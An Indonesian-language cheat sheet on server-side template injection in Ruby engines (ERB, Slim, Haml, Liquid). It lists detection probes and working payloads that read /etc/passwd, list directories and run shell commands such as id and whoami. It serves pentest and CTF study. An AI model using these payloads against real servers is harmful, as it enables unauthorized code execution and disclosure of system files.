# Server Side Template Injection - Ruby

> **Server-Side Template Injection (SSTI)** adalah kerentanan di mana penyerang dapat menyisipkan kode berbahaya ke dalam template di sisi server, sehingga server dapat mengeksekusi perintah arbitrer. Pada Ruby, SSTI bisa terjadi pada engine seperti ERB (Embedded Ruby), Haml, Liquid, Slim, dan lainnya jika input pengguna tidak disaring dengan benar.

## Ringkasan

- [Library Template Populer](#library-template-populer)
- [Payload Dasar](#payload-dasar)
- [Payload Spesifik Engine](#payload-spesifik-engine)
- [Referensi](#referensi)

## Library Template Populer

| Nama Template    | Format Payload | Bahasa Pemrograman |
| ---------------- | -------------- | ------------------ |
| ERB/Erubi/Erubis | `<%= ... %>`   | Ruby               |
| Haml             | `#{ ... }`     | Ruby               |
| Slim             | `#{ ... }`     | Ruby               |
| Liquid           | `{{ ... }}`    | Ruby               |
| Mustache         | `{{ ... }}`    | Ruby               |

## Payload Dasar

Coba payload berikut pada input yang dicurigai:

```erb
<%= 7 * 7 %>
#{ 7 * 7 }
{{ 7 * 7 }}
```

Jika output menjadi `49`, kemungkinan aplikasi rentan SSTI.

## Payload Spesifik Engine

### ERB / Erubi / Erubis

- **Injeksi Dasar:**
  ```erb
  <%= 7 * 7 %>
  ```
- **Baca file `/etc/passwd`:**
  ```erb
  <%= File.open('/etc/passwd').read %>
  ```
- **List file dan direktori:**
  ```erb
  <%= Dir.entries('/') %>
  ```
- **Eksekusi perintah:**
  ```erb
  <%= `id` %>
  <%= system('ls /') %>
  <%= IO.popen('ls /').readlines() %>
  <% require 'open3' %><% a,b,c,d=Open3.popen3('whoami') %><%= b.readline() %>
  ```

### Slim

- **Injeksi Dasar:**
  ```slim
  #{ 7 * 7 }
  ```
- **Eksekusi perintah:**
  ```slim
  #{ %x|id| }
  ```

### Haml

- **Injeksi Dasar:**
  ```haml
  #{ 7 * 7 }
  ```
- **Eksekusi perintah:**
  ```haml
  #{ %x|ls /| }
  ```

### Liquid / Mustache

- **Injeksi Dasar:**
  ```liquid
  {{ 7*7 }}
  ```

## Tips

- Selalu cek output aplikasi setelah mengirim payload.
- Gunakan variasi payload jika satu format tidak berhasil.
- Setelah engine teridentifikasi, cari dokumentasi exploitasi engine tersebut.
- Gunakan payload hanya di lingkungan legal (CTF/lab).

## Referensi

- [PayloadAllTheThings - SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
